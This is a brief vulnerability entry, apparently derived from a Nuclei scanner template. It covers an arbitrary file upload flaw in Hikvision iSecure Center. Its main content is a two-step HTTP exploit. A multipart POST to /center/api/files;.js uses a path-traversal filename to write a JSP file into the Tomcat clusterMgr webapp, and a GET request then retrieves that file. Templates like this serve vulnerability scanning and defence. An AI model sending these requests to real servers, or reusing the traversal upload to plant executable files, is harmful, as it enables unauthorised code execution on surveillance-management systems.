# Vulnerability: Hikvision iSecure Center - File Upload
**Classification:** FILEUPLOAD
**Source:** Nuclei Template (`hikvision-js-files-upload.yaml`)

## Description
THikvision iSecure Center /center/api/files;.js has an arbitrary file upload vulnerability

## Vulnerable Code Pattern / Exploit Payload
```http
POST /center/api/files;.js HTTP/1.1
Host: {{Hostname}}
Content-Type: multipart/form-data; boundary=----WebKitFormBoundarygcflwtei
User-Agent: Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2226.0 Safari/537.36

------WebKitFormBoundarygcflwtei
Content-Disposition: form-data; name="upload";filename="../../../../../bin/tomcat/apache-tomcat/webapps/clusterMgr/{{filename}}.jsp"
Content-Type:image/jpeg

{{print}}
------WebKitFormBoundarygcflwtei--

GET /clusterMgr/{{filename}}.jsp;.js HTTP/1.1
Host: {{Hostname}}
```

